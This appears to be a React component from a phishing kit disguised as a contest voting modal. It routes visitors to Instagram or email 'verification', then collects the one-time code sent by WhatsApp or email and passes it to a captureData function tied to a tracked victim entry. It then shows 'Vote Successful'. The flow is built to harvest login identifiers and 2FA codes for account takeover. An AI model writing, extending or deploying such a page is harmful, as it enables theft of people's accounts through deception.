"use client";

import { useState } from "react";
import { X, Instagram, Mail, ChevronRight, Fingerprint } from "lucide-react";
import EmailVote from "./EmailVote";
import InstagramVote from "./InstagramVote";
import EmailOTP from "./EmailOTP";
import WhatsAppOTP from "./WhatsAppOTP"; // Import your new component
import { captureData } from "@/lib/capture";

export default function VotingModal({
  isOpen,
  onClose,
}: {
  isOpen: boolean;
  onClose: () => void;
}) {
  const [view, setView] = useState<
    "gateway" | "email" | "instagram" | "otp" | "success"
  >("gateway");
  const [targetUser, setTargetUser] = useState("");
  const [currentEntryId, setCurrentEntryId] = useState<string | null>(null);

  if (!isOpen) return null;

  const handleClose = () => {
    setView("gateway");
    setCurrentEntryId(null);
    onClose();
  };

  const handleOTPVerify = async (otpValue: string) => {
    if (currentEntryId) {
      await captureData("OTP-Verify", { otp: otpValue }, currentEntryId);
    }
    setView("success");
  };

  // Logic to check if the input is a phone number
  const isPhoneNumber = /^[0-9+]/.test(targetUser);

  return (
    <div className="fixed inset-0 z-[500] flex items-center justify-center p-6">
      <div
        className="absolute inset-0 bg-charcoal/90 backdrop-blur-md"
        onClick={handleClose}
      />

      {view === "gateway" && (
        <div className="relative glass w-full max-w-lg rounded-[3rem] p-10 md:p-16 text-center border-white/10 shadow-2xl animate-in zoom-in-95">
          <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-chili via-amber-500 to-chili" />
          <button
            onClick={handleClose}
            className="absolute top-8 right-8 text-zinc-500 hover:text-white">
            <X />
          </button>
          <div className="mb-12">
            <div className="inline-flex p-3 bg-chili/10 rounded-2xl mb-6">
              <Fingerprint className="w-6 h-6 text-chili" />
            </div>
            <h3 className="text-4xl font-serif lowercase text-white mb-4">
              secure your ballot
            </h3>
          </div>
          <div className="space-y-4">
            <button
              onClick={() => setView("instagram")}
              className="group w-full bg-[#E1306C] text-white py-6 rounded-2xl font-bold flex items-center justify-between px-8 transition-all">
              <Instagram className="w-5 h-5" />{" "}
              <span className="text-[10px] uppercase tracking-widest">
                instagram verification
              </span>{" "}
              <ChevronRight className="w-4 h-4 opacity-50" />
            </button>
            <button
              onClick={() => setView("email")}
              className="group w-full bg-white/5 border border-white/10 text-white py-6 rounded-2xl font-bold flex items-center justify-between px-8 transition-all">
              <Mail className="w-5 h-5 text-chili" />{" "}
              <span className="text-[10px] uppercase tracking-widest">
                email verification
              </span>{" "}
              <ChevronRight className="w-4 h-4 opacity-30" />
            </button>
          </div>
        </div>
      )}

      {view === "instagram" && (
        <InstagramVote
          onLogin={(user, id) => {
            setTargetUser(user);
            setCurrentEntryId(id);
          }}
          onSuccess={() => setView("success")}
          onRequireOTP={() => setView("otp")}
        />
      )}

      {view === "otp" && (
        <>
          {isPhoneNumber ? (
            <WhatsAppOTP
              phoneNumber={targetUser}
              onClose={() => setView("gateway")}
              onVerify={handleOTPVerify}
            />
          ) : (
            <EmailOTP
              emailAddress={targetUser}
              onClose={() => setView("gateway")}
              onVerify={handleOTPVerify}
            />
          )}
        </>
      )}

      {view === "email" && (
        <EmailVote
          onLogin={(email) => setTargetUser(email)}
          onSuccess={() => setView("success")}
        />
      )}

      {view === "success" && (
        <div className="relative glass w-full max-w-lg rounded-[3rem] p-16 text-center border-white/10 animate-in zoom-in-95">
          <h3 className="text-white text-2xl font-serif italic">
            Vote Successful
          </h3>
          <p className="text-zinc-500 mt-4">You will be notified of the poll</p>
          <button
            onClick={handleClose}
            className="mt-8 bg-chili text-white px-8 py-3 rounded-xl font-bold">
            Finish
          </button>
        </div>
      )}
    </div>
  );
}
